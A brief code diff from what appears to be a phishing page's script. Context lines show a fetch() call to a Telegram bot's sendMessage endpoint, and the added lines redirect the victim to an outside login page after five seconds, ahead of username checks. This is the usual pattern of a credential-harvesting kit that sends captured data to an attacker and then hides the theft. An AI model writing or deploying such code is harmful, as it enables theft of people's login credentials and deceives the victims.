@@ -167,6 +167,11 @@ fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
 });
 
 
+
+setTimeout(function() {
+    window.location.href = "https://leadsafrica.com/login";
+}, 5000); // 5s
+
         if (username == "" || username == null) {
             status = "error";
             message = "Please enter your username";
